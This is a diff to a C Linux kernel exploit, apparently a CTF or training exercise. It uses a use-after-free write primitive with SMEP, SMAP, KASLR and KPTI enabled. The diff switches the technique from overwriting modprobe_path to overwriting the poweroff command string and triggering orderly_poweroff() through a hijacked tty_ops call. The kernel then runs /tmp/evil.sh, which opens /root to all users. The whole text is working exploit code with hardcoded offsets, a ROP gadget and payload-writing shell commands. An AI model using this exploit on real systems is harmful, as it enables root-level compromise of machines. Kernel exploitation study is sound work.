@@ -1,12 +1,12 @@
 /**
- * uaf-aaw:
+ * uaf-aaw-poweroff:
  *   - SMEP is enabled
  *   - SMAP is enabled
  *   - KASLR is enabled
  *   - KPTI is enabled
  *
  * Causes the kernel to execute `/tmp/evil.sh`, by modifying the
- * `modprobe_path`, and triggering `call_modprobe()`.
+ * `poweroff_cmd`, and calling `orderly_poweroff()`.
  */
 
 #include <fcntl.h>
@@ -22,7 +22,8 @@ unsigned long kbase, g_buf, current;
 unsigned long user_cs, user_ss, user_rsp, user_rflags;
 
 #define ofs_tty_ops 0xc39c60
-#define addr_modprobe_path (kbase + 0xe38480)   // "/sbin/modprobe"
+#define addr_sbin_poweroff_str (kbase + 0xe37cc0) // "/sbin/poweroff"
+#define addr_orderly_poweroff (kbase + 0x072fa0) 
 #define rop_mov_prdx_rcx (kbase + 0x1b2d06)     // mov qword [rdx], rcx; ret;
 
 static void win() {
@@ -102,14 +103,17 @@ int main() {
   // overwrite modprobe_path
   char cmd[] = "/tmp/evil.sh";
   for (int i = 0; i < sizeof(cmd); i += 4) {
-    AAW32(addr_modprobe_path + i, *(unsigned int*)&cmd[i]);
+    AAW32(addr_sbin_poweroff_str + i, *(unsigned int*)&cmd[i]);
   }
 
   system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
   system("chmod +x /tmp/evil.sh");
-  system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
-  system("chmod +x /tmp/pwn");
-  system("/tmp/pwn"); // modprobe_pathの呼び出し
+
+  // call orderly_poweroff
+  *(unsigned long*)&buf[0x3f8] = addr_orderly_poweroff;
+  *(unsigned long*)&buf[0x18] = g_buf + 0x3f8 - 12*8;
+  write(fd2, buf, 0x400);
+  ioctl(cache_fd, 0xdeadbeef, 0xcafebabe);
 
   return 0;
 }
